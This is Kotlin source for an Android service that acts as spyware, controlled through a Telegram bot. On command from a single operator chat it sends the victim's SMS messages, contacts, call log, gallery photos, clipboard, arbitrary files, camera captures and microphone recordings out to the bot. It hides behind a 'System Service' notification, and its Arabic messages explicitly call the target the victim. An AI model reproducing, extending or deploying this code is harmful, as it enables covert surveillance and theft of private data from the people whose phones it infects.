package com.example.namprfek

import android.app.*
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.Settings
import android.net.Uri
import androidx.core.app.NotificationCompat
import java.util.concurrent.Executors

class TelegramService : Service() {

    private val api by lazy { TelegramApi(Config.BOT_TOKEN) }
    private val pool = Executors.newFixedThreadPool(3)
    @Volatile private var running = true
    private var offset = 0L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotification())
        Thread { pollLoop() }.start()
    }

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel("svc", "System", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, "svc")
            .setContentTitle("System Service")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true).build()
    }

    private fun pollLoop() {
        while (running) {
            try {
                val updates = api.getUpdates(offset)
                for (i in 0 until updates.length()) {
                    val u = updates.getJSONObject(i)
                    offset = u.getLong("update_id") + 1
                    val msg = u.optJSONObject("message") ?: continue
                    val chat = msg.getJSONObject("chat").getString("id")
                    if (chat != Config.CHAT_ID) continue
                    val text = msg.optString("text", "").trim()
                    if (text.isEmpty()) continue
                    pool.execute { handle(chat, text) }
                }
            } catch (e: Exception) { Thread.sleep(3000) }
        }
    }

    private fun handle(chat: String, text: String) {
        val parts = text.split(" ", limit = 2)
        val cmd = parts[0].lowercase()
        val arg = parts.getOrNull(1) ?: ""
        try {
            when (cmd) {
                "/start", "/help" -> api.sendMessage(chat, "أهلاً بك يا زعيم 👑\nاختر الأمر من القايمة اللي تحت أو اكتبه:\n/info\n/sms\n/contacts\n/calls\n/gallery\n/clipboard\n/ls\n/get\n/photo\n/selfie\n/mic\n/notifications")
                
                "/info" -> api.sendMessage(chat, Handlers.deviceInfo(this))
                "/sms" -> api.sendDocument(chat, Handlers.sms(this), "الرسايل")
                "/contacts" -> api.sendDocument(chat, Handlers.contacts(this), "جهات الاتصال")
                "/calls" -> api.sendDocument(chat, Handlers.calls(this), "سجل المكالمات")
                
                "/gallery" -> {
                    val photos = Handlers.getLatestPhotos(this)
                    if (photos.isEmpty()) api.sendMessage(chat, "مفيش صور")
                    else photos.forEach { api.sendDocument(chat, it, "صورة من المعرض") }
                }
                
                "/clipboard" -> api.sendMessage(chat, "آخر حاجة اتكوبيت:\n${Handlers.getClipboard(this)}")
                
                "/ls" -> api.sendMessage(chat, Handlers.listFiles(if (arg.isEmpty()) Environment.getExternalStorageDirectory().absolutePath else arg))
                
                "/get" -> {
                    val f = Handlers.getFile(arg)
                    if (f != null) api.sendDocument(chat, f, arg) else api.sendMessage(chat, "مش موجود")
                }
                
                "/photo" -> {
                    val f = CameraHelper.capture(this, CameraCharacteristics.LENS_FACING_BACK)
                    if (f != null) api.sendDocument(chat, f, "كاميرا خلفية") else api.sendMessage(chat, "فشلت")
                }
                
                "/selfie" -> {
                    val f = CameraHelper.capture(this, CameraCharacteristics.LENS_FACING_FRONT)
                    if (f != null) api.sendDocument(chat, f, "كاميرا أمامية") else api.sendMessage(chat, "فشلت")
                }
                
                "/mic" -> {
                    val secs = arg.toIntOrNull() ?: 10
                    val f = AudioHelper.record(this, secs)
                    if (f != null) api.sendDocument(chat, f, "تسجيل ميك") else api.sendMessage(chat, "فشل")
                }
                
                "/notifications" -> {
                    // فتح إعدادات الإشعارات للضحية لو حابب تفعلها من هنا
                    try {
                        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                        api.sendMessage(chat, "تم فتح إعدادات الإشعارات على جهاز الضحية.")
                    } catch (e: Exception) {}
                }

                else -> api.sendMessage(chat, "أمر غير معروف")
            }
        } catch (e: Exception) {
            api.sendMessage(chat, "خطأ: ${e.message}")
        }
    }

    override fun onDestroy() {
        running = false
        pool.shutdownNow()
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context) {
            val i = Intent(ctx, TelegramService::class.java)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        }
    }
}